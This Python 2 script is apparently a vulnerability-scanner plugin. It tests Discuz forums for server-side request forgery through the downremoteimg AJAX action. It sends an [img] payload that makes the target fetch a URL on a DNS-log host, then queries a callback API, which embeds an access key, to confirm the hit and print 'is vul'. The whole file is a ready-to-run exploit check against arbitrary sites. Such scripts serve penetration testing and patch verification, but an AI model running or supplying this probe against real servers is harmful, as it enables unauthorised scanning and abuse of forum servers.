#! /usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import urlparse
import re
import random
import time
import sys

def verify(target):
	request = requests.session()
	try:
		domain = "%s"%(urlparse.urlparse(target).netloc) 
		num_str = str(random.randint(11111, 99999)) 
		forumurl = ("{domain}/forum.php".format(domain=target))
		response = request.get(forumurl, timeout=5, verify=False)
		formhash = re.findall(r'formhash" value="(.*?)"',response.content)
		netloc = urlparse.urlparse(target).netloc
		payload = 'http://pentest.22e642.dnslog.info/tangscan?s={netloc}{num_str}.jpg'.format(netloc=netloc,num_str=num_str)
		url = "{website}/forum.php?mod=ajax&action=downremoteimg&formhash={formhash}&message=[img]{payload}[/img]".format(
			website=target,
			formhash=formhash[0] if formhash else '',
			payload=payload) 
		response = request.get(url, timeout=5, verify=False)
		time.sleep(5)#防止网络延迟导致漏报 
		cloudeye_url = "http://wydns.sinaapp.com/api/569448dd8f4c2ab10aad4f9e78e112e0/pentest" 
		response = requests.post(cloudeye_url, timeout=15, verify=False) 
		if response.content.find(domain)!=-1 and response.content.find(num_str)!=-1: 
			print "is vul"
	except Exception, e:
		print e
if __name__=='__main__':
	verify(sys.argv[1])
